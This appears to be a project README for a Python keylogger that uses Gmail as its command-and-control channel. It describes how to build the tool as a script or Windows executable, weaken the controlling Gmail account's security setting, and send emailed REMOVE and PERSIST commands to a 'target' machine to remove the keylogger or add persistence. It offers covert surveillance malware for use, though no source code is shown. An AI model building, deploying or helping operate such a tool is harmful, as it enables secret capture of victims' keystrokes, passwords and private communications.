# Keylogger
A simple keylogger that uses Gmail as C&C.<br>
It's not perfect, I wrote it like in two school days. That's why it looks rushed.
<br>

[![Version](https://img.shields.io/badge/Version-v1.0.0-blue.svg)]()
[![Video](https://img.shields.io/badge/Video-Tutorial-yellow.svg)](https://www.youtube.com/watch?v=vBwotqamsxg)

### Support
Just another broke a<b>**</b> college student trying to make money. **$5** would be enough, thanks.<br><br>
[![Donate](https://img.shields.io/badge/PayPal-Donate-orange.svg)](https://www.paypal.me/Msheikh03)


**DO NOT USE YOUR PERSONAL EMAIL**

### Requirements
* Python *v3.6.x* | *3.7.x*
* Windows **(Only if you want to compile it)**

### Installation
```sh
pip install -r requirements.txt
```

### Usage
* Enable [less-secure-apps](https://myaccount.google.com/lesssecureapps) on your gmail
* Change directory to the build folder
* run python build.py -h
* Use "-t python" option to create a normal Python File
* Use "-t exe" option to create an executable **(Only on Windows)**

**Does not compile inside a virtual environment**

### Commands
1. REMOVE - To remove the keylogger from target
2. PERSIST - To add persistence to the keylogger(Only when -ap option wasn't used)

### Command
* Login into same Gmail account that the program is using
* Press Compose, to create a new email
* Set the "To" field to the email address the program is using
* Set the "Subject" field to Command
* In the body field type a command. Right now a command is either REMOVE or PERSIST
* Press Send and wait, the program only checks for commands every 2 minutes
* **You're basically login into the same email as the program and sending an email to yourself**
